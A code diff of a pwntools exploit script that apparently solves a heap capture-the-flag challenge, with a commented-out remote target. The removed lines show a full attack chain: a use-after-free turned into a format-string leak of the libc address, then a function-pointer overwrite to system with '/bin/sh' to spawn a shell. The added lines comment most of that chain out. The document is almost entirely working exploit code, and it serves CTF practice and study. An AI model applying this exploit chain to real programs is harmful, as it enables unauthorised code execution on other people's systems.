@@ -39,22 +39,24 @@ if __name__ == '__main__':
     #         p.close()
     
     p = elf.process()
+    #p = remote('jh2i.com', 50021)
 
     # use after free -> format string -> leak libc
     adopt(b'AAAA')
     disown(0)
-    rename(0, p64(elf.sym['whale_view'] + 8))
-    adopt(p64(elf.plt['printf']))
-    rename(0, b'%13$p')
-    observe(0, ret=False)
-    libc.address = eval(p.recvlines(3)[-1]) - (libc.sym['_IO_fgets'] + 173)
-    log.info('libc base at 0x%x' % libc.address)
+    rename(0, p64(elf.sym['whale_view']))
+    #adopt(p64(elf.sym['whale_view']))
+    # adopt(p64(elf.plt['printf']))
+    # rename(0, b'%13$p')
+    # observe(0, ret=False)
+    # libc.address = eval(p.recvlines(3)[-1]) - (libc.sym['_IO_fgets'] + 173)
+    # log.info('libc base at 0x%x' % libc.address)
 
     # change the pointer of sym.view_whale_one to system
-    disown(0)
-    rename(0, p64(elf.sym['whale_view'] + 8))
-    adopt(p64(libc.sym['system']))
-    rename(0, b'/bin/sh')
-    observe(0, ret=False) # win
+    # disown(0)
+    # rename(0, p64(elf.sym['whale_view'] + 8))
+    # adopt(p64(libc.sym['system']))
+    # rename(0, b'/bin/sh')
+    # observe(0, ret=False) # win
     
     p.interactive()
